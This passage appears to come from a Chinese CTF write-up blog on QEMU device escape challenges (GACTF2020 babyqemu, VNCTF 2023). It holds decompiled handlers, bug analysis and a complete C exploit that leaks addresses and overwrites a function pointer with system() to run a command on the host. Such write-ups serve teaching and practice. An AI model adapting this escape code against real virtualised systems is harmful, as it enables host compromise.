class="number">0</span>,<span class="number">0x67616c66</span>); <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">28</span>,<span class="number">0x20746163</span>); <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GACTF2020-babyqemu"><a href="#GACTF2020-babyqemu" class="headerlink" title="GACTF2020 babyqemu"></a>GACTF2020 babyqemu</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="denc-mmio-read"><a href="#denc-mmio-read" class="headerlink" title="denc_mmio_read"></a>denc_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = addr &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="denc-mmio-write"><a href="#denc-mmio-write" class="headerlink" title="denc_mmio_write"></a>denc_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)&amp;opaque-&gt;key[addr];</span><br><span class="line">      opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>] = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="denc-pmio-read"><a href="#denc-pmio-read" class="headerlink" title="denc_pmio_read"></a>denc_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> || (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="denc-pmio-write"><a href="#denc-pmio-write" class="headerlink" title="denc_pmio_write"></a>denc_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (__int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = val ^ *(_DWORD *)&amp;opaque-&gt;key[<span class="number">4</span> * addr];</span><br><span class="line">        opaque-&gt;buf[addr] = result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">0x660</span> )</span><br><span class="line">        <span class="keyword">return</span> opaque-&gt;fun(opaque-&gt;buf, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到，在<code>denc_mmio_read</code>函数中存在数组越界读，在<code>denc_mmio_write</code>函数中纯在数组越界写。在<code>denc_pmio_write</code>函数中调用了<code>fun</code>函数，而该<code>fun</code>是一个函数指针，我们可以通过输入越界读来泄露出地址，然后再利用数组越界写来将<code>fun</code>改为<code>system@plt</code>的地址，即可实现逃逸</p>
<h4 id="关键结构体"><a href="#关键结构体" class="headerlink" title="关键结构体"></a>关键结构体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 DencState struc ; (sizeof=0xB48, mappedto_112)</span><br><span class="line">00000000 field_0 db 2808 dup(?)</span><br><span class="line">00000AF8 key db 32 dup(?)</span><br><span class="line">00000B18 field_B18 db 8 dup(?)</span><br><span class="line">00000B20 buf dd 8 dup(?)</span><br><span class="line">00000B40 fun dq ?                                ; offset</span><br><span class="line">00000B48 DencState ends</span><br></pre></td></tr></table></figure>
<p>由于<code>denc_pmio_write</code>在写入数据时要将数据和<code>key</code>进行异或加密，但<code>key</code>可以让我们通过<code>denc_mmio_write</code>函数和<code>denc_mmio_read</code>相互配合来达到泄露<br>由于笔者的<code>C</code>语言学的像狗屎一样，所以这一道题在类型转换上面花了很多时间，而题目则是看了就瞬间有完整的攻击思路了</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c000</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;iopl(3)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *pmio_fd = fopen(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!pmio_fd)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pmio_fd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the elf base...&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> leak = mmio_read(<span class="number">8</span>) + (((<span class="type">size_t</span>)mmio_read(<span class="number">9</span>)) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    <span class="type">size_t</span> elf_base = leak - <span class="number">3841704</span>;</span><br><span class="line">    <span class="type">size_t</span> system = elf_base + <span class="number">0x2CCB60</span>;</span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;system@plt&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the key...&quot;</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        mmio_write(i, <span class="number">0</span>);</span><br><span class="line">        key[i] = mmio_read(i);</span><br><span class="line">    &#125;</span><br><span class="line">    binary_dump(<span class="string">&quot;key&quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the buf to cat flag...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">0</span>]) ^ key[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">1</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">4</span>]) ^ key[<span class="number">1</span>]);</span><br><span class="line">    mmio_write(<span class="number">2</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">8</span>]) ^ key[<span class="number">2</span>]);</span><br><span class="line">    info(<span class="string">&quot;change buf success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the fun...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, (system &amp; <span class="number">0xFFFFFFFF</span>) ^ key[<span class="number">8</span>]);</span><br><span class="line">    mmio_write(<span class="number">9</span>, ((system &gt;&gt; <span class="number">32</span>)&amp;<span class="number">0xffffffff</span>) ^ key[<span class="number">9</span>]);</span><br><span class="line">    info(<span class="string">&quot;change the fun success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x660</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="VNCTF-2023-escape-langlang-mountain2"><a href="#VNCTF-2023-escape-langlang-mountain2" class="headerlink" title="[VNCTF 2023] escape_langlang_mountain2"></a>[VNCTF 2023] escape_langlang_mountain2</h2><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="vn-mmio-read"><a href="#vn-mmio-read" class="headerlink" title="vn_mmio_read"></a>vn_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + opaque);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="vn-mmio-write"><a href="#vn-mmio-write" class="headerlink" title="vn_mmio_write"></a>vn_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(opaque + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;<span class="comment">// 任意地址写</span></span><br><span class="line">      *(_DWORD *)(opaque + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3C</span> )</span><br><span class="line">        *(_DWORD *)(opaque + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; HIDWORD(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + HIDWORD(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>vn_mmio_write</code>函数中，当<code>addr == 0x10</code>时存在数组溢出，从而能够让我们能够实现数组越界读。我们将<code>val</code>设置为为负数，读取<code>const MemoryRegionOps *ops</code>；来泄露出<code>qemu</code>地址，读取<code>void *opaque</code>;来泄露出堆地址。我们可以看到在<code>vn_mmio_write</code>函数中，当<code>addr ==0x30</code>时，我们有一次任意地址写的机会。于是我们的思路为，通过<code>main_loop_tlg</code>来泄露出<code>QEMUTimerList</code>的地址，然后修改<code>QEMUTimerList</code>中的<code>active_timers</code>指针指向我们我们伪造的<code>QEMTTimer</code>即可实现程序流的劫持</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 